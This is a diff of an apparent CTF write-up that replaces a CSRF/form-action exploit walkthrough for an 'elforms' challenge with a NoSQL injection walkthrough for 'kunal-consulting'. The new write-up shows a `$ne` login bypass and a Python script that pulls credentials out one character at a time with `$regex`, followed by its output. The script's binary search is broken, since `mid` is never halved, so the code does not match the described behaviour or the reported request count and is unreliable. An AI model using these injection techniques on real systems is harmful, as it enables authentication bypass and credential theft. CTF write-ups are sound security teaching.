@@ -28,265 +28,301 @@ if you wish to brute-force, please limit your wordlists or attack scope._
 ## Hints
 
 **Hint 1:**  
-User input should never be trusted, especially not for authentication! As always, check out your browser’s DevTools (particularly the Elements, Sources, and Network tabs).
+User input should never be trusted, especially not for authentication! As always, check out your browser’s DevTools
+(particularly the Elements, Sources, and Network tabs).
 
 **Hint 2:**  
-JSON is all powerful; there’s more to it than strings. There’s also an “employee login” page. Humans don’t always have the best memory and might re-use stuff.
+JSON is all powerful; there’s more to it than strings. There’s also an “employee login” page. Humans don’t always have
+the best memory and might re-use stuff.
 
 ## Write-up
 
 <details>
 <summary>Reveal write-up</summary>
 
-First, in `/init-db.js`, we can see where the flag will be stored:
+Let's take a look at the client JavaScript on the customer login (`/customer-login`) page:
 
 ```js
-db.prepare(
-  `insert into user (id, username, password) values (
-    'f02536d1-a338-4d15-bcaa-c9ffbd2659a8',
-    'admin',
-    '$2y$10$c2VPz9tvLkA.ApNmD.W6X.JTcRYY2/2nJM5cFDOXYAl5rS1XVjcL6'
-  )`
-).run();
+const submitBtn = document.getElementById("submit");
 
-db.prepare(
-  `insert into form (id, author_id, name, description, questions, meta, public) values (
-    '7e27fe8a-447e-4c8f-bb37-133aae88f07e',
-    'f02536d1-a338-4d15-bcaa-c9ffbd2659a8',
-    ?,
-    'top secret form',
-    '[{"name":"foo","defaultValue":"bar"},{"name":"foo","defaultValue":"bar"}]',
-    '{"og:title":"...","og:description":"top secret form"}',
-    0
-  )`
-).run(process.env.FLAG || "csd{test_flag}");
-```
+submitBtn.addEventListener("click", async () => {
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
 
-The admin user creates a form with the flag as the title, but we don't have access to this form.
+  // don't waste precious cpu cycles on the server
+  if (username.length > 7 || password.length > 100) return alert("Invalid username/password");
 
-Upon signing up, we can attempt to create a form. Note that the homepage mentions "testing" a form submission, which may
-hint that this is a cross-site scripting (XSS) challenge.
+  const response = await fetch("/login", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({ username, password }),
+  });
 
-Let's first create a test form by inputting random values into `/forms/create`:
+  const text = await response.text();
+  alert(text);
 
-![Form submit page](/blog-assets/elforms-advent-of-ctf-2024/form-submit.png)
-
-We can see that the default values we inputted are indeed pre-filled into the fields. Submitting the form sends a POST
-request to the same URL, simple HTML forms. No JavaScript is involved here.
-
-Note that this is also a different domain than our original URL: `form-elforms.csd.lol` rather than `elforms.csd.lol`.
-
-Now, let's try going back to `/forms` and pressing the Test button. We get a message that an elf will go "test" our
-form, but there are no updates beyond that.
-
-Taking a look at the source code, we can see that the code to test the form in `/main/server.js` looks pretty normal:
-
-```js
-await page.setCookie({
-  name: "token",
-  value: token,
-  domain: process.env.MAIN_BASE_URL.replace("http://", "").replace("https://", ""),
-  path: "/",
-  expires: Date.now() + 30 * 24 * 60 * 60 * 1000,
-  httpOnly: true,
-  secure: false,
-});
-
-await page.goto(url);
-
-await setTimeout(1000);
-
-await page.locator("#submit").click();
-
-await setTimeout(1000);
-
-await page.close();
-```
-
-It sets a `token` cookie with `elforms.csd.lol` (from the environment variable), waits a second, looks for a button on
-the page with the ID `submit`, and clicks on it. It then waits another second and closes the page.
-
-```js
-cluster.queue({
-  url: `${process.env.FORM_BASE_URL}/${encodeURIComponent(form.name)}_${form.id}`,
-  token: jwt.sign({ id: tester.id }, process.env.JWT_SECRET, {
-    expiresIn: "30d",
-  }),
+  if (response.status === 200) window.location.href = "/";
 });
 ```
 
-The `token` cookie is a valid and signed [JSON Web Token (JWT)](https://en.wikipedia.org/wiki/JSON_Web_Token) of the
-tester, who by default is the admin. However, the cookie is stored on the `elforms.csd.lol` domain, which is not the
-same as the form submission domain `form-elforms.csd.lol`. More on this later.
+So, it seems like the username can have a maximum of 7 characters and the password can have a maximum of 100 characters.
+Well, that doesn't sound very brute-forceable.
 
-Note that we can only test our own forms:
-
-```js
-if (form.author_id !== user.id) return res.status(401).send("Unauthorized");
-```
-
-It checks this by getting the username from our JWT cookie:
+We can see that the request is being sent in JSON. Let's look at the JS on the employee login (`/employee-login`) page
+now. It's identical to the customer login page, except the client-side checks for usernames and passwords are different:
 
 ```js
-function getUser(req) {
-  if (!req.cookies.token) return;
-
-  try {
-    const { id } = jwt.verify(req.cookies.token, process.env.JWT_SECRET);
-    if (typeof id !== "string") return false;
-
-    return db.prepare("SELECT id, username FROM user WHERE id = ?").get(id);
-  } catch (error) {
-    console.error(error);
-    return false;
-  }
-}
+if (!/^[A-z0-9_]{1,16}$/.test(username)) return alert("Incorrect username/password");
+if (!/^[A-z0-9_]{1,128}$/.test(password)) return alert("Incorrect username/password");
 ```
 
-There is something else that stands out—it adds the tester to the `shared_ids` of the form.
+This [regular expression (regex)](https://en.wikipedia.org/wiki/Regular_expression) checks to see that the username and
+password only contains alphanumerical characters or underscores. The maximum length for a username is 16 characters,
+while it is 128 characters for passwords.
 
-```js
-const shared_ids = form.shared_ids ? JSON.parse(form.shared_ids) : [];
-shared_ids.push(tester_id);
-// ...
-db.prepare("UPDATE form SET shared_ids = ? WHERE id = ?").run(JSON.stringify([...new Set(shared_ids)]), id);
-```
+Well, that's not very useful. However, JSON allows for more than strings. Perhaps, it can accept objects?
 
-And when checking which forms a user can see and edit, the server checks if the user is in the `shared_ids` of the form:
+A common database used in JavaScript is [MongoDB](https://en.wikipedia.org/wiki/MongoDB). In MongoDB, you can use
+[query operators](https://www.mongodb.com/docs/manual/reference/operator/query/) to use more powerful matching filters.
 
-```js
-const forms = db.prepare("SELECT * FROM form WHERE author_id = ? OR shared_ids LIKE ?").all(user.id, `%${user.id}%`);
-```
-
-Hm, but you shouldn't need to _edit_ the form to submit a form. This seems weird, there could be something more to this.
-
-We can't just edit `tester_id` to be our own ID, as that wouldn't be our own logged in ID (according to the cookie).
-But, we can use the _tester_ (who has the admin cookie) to test the admin form which has the flag as the name.
-
-So, we need to specify our own user ID as the `tester_id` to add it to the `shared_ids` list and specify `id` to be the
-top secret form ID from `/init-db.js`.
-
-So, how can we utilize the tester's cookie? We need to either extract it, or have it run a request while it's testing to
-have the cookie attached to the request.
-
-We can't extract the cookie—recall that the cookie is
-[HTTP-only](https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/Cookies#httponly). It
-must be attached to a request.
-
-Well, it won't be attached to just any request we make. It has to be on that domain, which is `elforms.csd.lol`.
-
-Let's start going through the source code for the form submission page.
-
-In `/form/views/pages/form.ejs`, we can see that the form name and ID are concatenated together with an underscore in
-the action attribute:
-
-```html
-<form action="<%= form.name %>_<%= form.id %>" method="post" id="form" class="mb-2"></form>
-```
-
-In HTML, the [`action` attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/form#action)
-allows us to change the URL where the form is submitted.
-
-Well, we have control over the name of the form. Plus, the `/` is not included in the original code, so we can specify
-any URL from any domain we want! (But the resulting URL will have the underscore and form ID at the end.)
-
-That's not a problem, though. We can simply append a URL fragment and it won't be included in the network request at
-all.
-
-So, if we have our form name be `http://elforms.csd.lol/forms/test#`, it will result in something like
-`action="http://elforms.csd.lol/forms/test#_51fbbcda-8a1d-4ea7-9f03-fc8498d37657"`.
-
-That will resolve to just `http://elforms.csd.lol/forms/test` in the network request. Conveniently, `POST /forms/test`
-also allows `application/x-www-form-urlencoded` for the body. So, we should just be able to set the field names and the
-default field values to the values we want.
-
-Let's craft a form for our tester to use:
+One of them is `$ne`, which matches for everything _except_ what's entered:
 
 ```json
-// POST /forms/create
+// POST /login
 {
-  "name": "https://elforms.csd.lol/forms/test#",
-  "description": "...",
-  "questions": [
-    { "name": "id", "defaultValue": "7e27fe8a-447e-4c8f-bb37-133aae88f07e" },
-    {
-      "name": "tester_id",
-      "defaultValue": "07cf1609-5c89-4df2-998d-df04102cb1b9"
-    }
-  ]
-}
-```
-
-Recall that `7e27fe8a-447e-4c8f-bb37-133aae88f07e` is the ID of the top secret form we want to make public to us.
-
-We can also get our account ID for `tester_id` by decoding the JWT:
-
-```bash
-$ echo 'eyJpZCI6IjA3Y2YxNjA5LTVjODktNGRmMi05OThkLWRmMDQxMDJjYjFiOSIsImlhdCI6MTc0ODEyMzc1MCwiZXhwIjoxNzUwNzE1NzUwfQ' | base64 --decode | jq
-base64: invalid input
-{
-  "id": "07cf1609-5c89-4df2-998d-df04102cb1b9",
-  "iat": 1748123750,
-  "exp": 1750715750
-}
-```
-
-However, a problem now arises. We are blocked by the `csrf()` middleware!
-
-```js
-function csrf(req, res, next) {
-  if (req.headers.referer && !req.headers.referer.startsWith(process.env.MAIN_BASE_URL)) {
-    return res.status(403).send("Forbidden");
-  }
-
-  next();
-}
-```
-
-However, this is a
-[Referer-based CSRF check](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses) and can be
-bypassed here by not having a `Referer` header at all.
-
-Well, conveniently, we can also custom-set our own meta tags, and one way to prevent the site from sending the Referer
-header in requests is by using `<meta name="referrer" content="none">`:
-
-```ejs
-<% Object.entries(form.meta).forEach(([name, content]) => { %>
-<meta name="<%= name %>" content="<%= content %>" />
-<% }); %>
-```
-
-So, our final payload to `POST /forms/create` is:
-
-```json
-// POST /forms/create
-{
-  "name": "https://elforms.csd.lol/forms/test#",
-  "description": "...",
-  "questions": [
-    { "name": "id", "defaultValue": "7e27fe8a-447e-4c8f-bb37-133aae88f07e" },
-    {
-      "name": "tester_id",
-      "defaultValue": "07cf1609-5c89-4df2-998d-df04102cb1b9"
-    }
-  ],
-  "meta": {
-    "referrer": "none"
+  "username": {
+    "$ne": "test"
+  },
+  "password": {
+    "$ne": "test"
   }
 }
 ```
 
-Please note that the URL in `name` is `https`, not `http`. Chromium will warn you if you send a form request in an
-insecure HTTP request.
+That returns:
 
-After creating this form, let's go back to `/forms` and press the Test button. After a few seconds, let's navigate back
-to `/forms`:
+```
+Login successful! We have no customers though...so who are you?
+```
 
-![Forms with flag](/blog-assets/elforms-advent-of-ctf-2024/forms-with-flag.png)
+Wow, it looks like it worked! (sorry about how guessy this was) But, this isn't very useful as we don't receive anything
+in this request. We need to obtain a username and password to use in the employee login.
 
-Looks like we've successfully added our user ID to the top secret form's `shared_ids`! Merry Christmas Eve!
+Unfortunately, the same attack doesn't work in `POST /employee-login`. But, our attack can tell us whether a username or
+password was correct.
 
-Flag: `csd{wh4t_4N_3v3ntFuL_cHR15TM45_3v3}`
+We don't have to guess each character one-by-one, though. MongoDB also offers a `$regex` operator, which allows us to
+filter by regex! Through regex, we can optimize our attack and reduce the number of requests needed.
+
+We can utilize a binary search approach:
+
+```py
+import re
+from time import sleep
+import requests
+
+url = "https://kunal-consulting.csd.lol"
+
+request_count = 0
+
+path = "sign-up"
+trigger = "taken"
+username = ""
+
+# Test a username or password to see if it passes the regex
+def test_password(regex):
+    global request_count, path, trigger, username
+
+    if path == "login":
+      data = {
+          "username": username,
+          "password": {
+              "$regex": regex
+          }
+      }
+    else:
+      data = {
+          "username": {
+              "$regex": regex
+          }
+      }
+
+    r = requests.post(f'{url}/{path}', json=data, allow_redirects=False)
+
+    request_count += 1
+
+    return trigger in r.text
+
+# Binary search algorithm
+def search_once(test_function, prefix=""):
+    min = 0
+    max = 127
+
+    while min <= max:
+        mid = (min + max)
+
+        if test_function(fr'^{re.escape(prefix)}[\x{mid:02x}-\x7f]'):
+            min = mid + 1
+        else:
+            max = mid - 1
+
+    return chr(max)
+
+# Keep searching until whole string found
+def search(test_function):
+    found = ""
+    while True:
+        found += search_once(test_function, prefix=found)
+        print(found)
+
+        if test_function(fr'^{found}$'):
+            return found
+
+username = search(test_password)
+
+path = "login"
+trigger = "successful"
+
+password = search(test_password)
+
+print("\nUsername: " + username)
+print("Password: " + password)
+
+print(f"Requests made: {request_count}")
+```
+
+For each character in the username, it will try half of all possible ASCII character values. If the server returns that
+we were successful, that must mean that specific character belongs to that half of that ASCII value. Then, it will
+continue to split the ASCII range in half until we find the actual character. It will then repeat this for each
+character, until it finds every character.
+
+Afterwards, the script uses the same method to find the password (although that takes just _slightly_ longer).
+
+This script can actually be optimized by only using alphanumerical characters and underscores as seen in the original JS
+code. I'll leave that as homework for you (definitely not because I'm lazy).
+
+```
+X
+Xh
+Xha
+XhaN
+XhaNy
+XhaNy2
+XhaNy22
+r
+re
+rea
+reas
+reaso
+reason
+reasons
+reasons_
+reasons_i
+reasons_i_
+reasons_i_u
+reasons_i_us
+reasons_i_use
+reasons_i_use_
+reasons_i_use_a
+reasons_i_use_a_
+reasons_i_use_a_r
+reasons_i_use_a_re
+reasons_i_use_a_rea
+reasons_i_use_a_real
+reasons_i_use_a_reall
+reasons_i_use_a_really
+reasons_i_use_a_really_
+reasons_i_use_a_really_l
+reasons_i_use_a_really_lo
+reasons_i_use_a_really_lon
+reasons_i_use_a_really_long
+reasons_i_use_a_really_long_
+reasons_i_use_a_really_long_p
+reasons_i_use_a_really_long_pa
+reasons_i_use_a_really_long_pas
+reasons_i_use_a_really_long_pass
+reasons_i_use_a_really_long_passw
+reasons_i_use_a_really_long_passwo
+reasons_i_use_a_really_long_passwor
+reasons_i_use_a_really_long_password
+reasons_i_use_a_really_long_password_
+reasons_i_use_a_really_long_password_1
+reasons_i_use_a_really_long_password_1_
+reasons_i_use_a_really_long_password_1_s
+reasons_i_use_a_really_long_password_1_se
+reasons_i_use_a_really_long_password_1_sec
+reasons_i_use_a_really_long_password_1_secu
+reasons_i_use_a_really_long_password_1_secur
+reasons_i_use_a_really_long_password_1_securi
+reasons_i_use_a_really_long_password_1_securit
+reasons_i_use_a_really_long_password_1_security
+reasons_i_use_a_really_long_password_1_security_
+reasons_i_use_a_really_long_password_1_security_2
+reasons_i_use_a_really_long_password_1_security_2_
+reasons_i_use_a_really_long_password_1_security_2_t
+reasons_i_use_a_really_long_password_1_security_2_to
+reasons_i_use_a_really_long_password_1_security_2_to_
+reasons_i_use_a_really_long_password_1_security_2_to_p
+reasons_i_use_a_really_long_password_1_security_2_to_pr
+reasons_i_use_a_really_long_password_1_security_2_to_pra
+reasons_i_use_a_really_long_password_1_security_2_to_prac
+reasons_i_use_a_really_long_password_1_security_2_to_pract
+reasons_i_use_a_really_long_password_1_security_2_to_practi
+reasons_i_use_a_really_long_password_1_security_2_to_practic
+reasons_i_use_a_really_long_password_1_security_2_to_practice
+reasons_i_use_a_really_long_password_1_security_2_to_practice_
+reasons_i_use_a_really_long_password_1_security_2_to_practice_m
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_t
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_ty
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typ
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typi
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typin
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_s
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_sk
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_ski
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skil
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skill
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_t
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_m
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_me
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mes
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_w
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_wi
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_wit
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_with
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_with_
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_with_y
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_with_yo
+reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_with_you
+
+Username: XhaNy22
+Password: reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_with_you
+Requests made: 832
+```
+
+It actually only took 832 requests to find the 7-character username and 97-character password!
+
+Now that we have the username and password, we can login on the employee login page (`/employee-login`):
+
+![Employee area page](/blog-assets/kunal-consulting-advent-of-ctf-2024/employee-area.png)
+
+Well, that's something. ~~(elite ball knowledge)~~ Merry three-days-until-Christmas!
+
+Flag: `csd{cOn5uL7iN9_CHIldR3N_5InC3_2009}`
 
 </details>
 
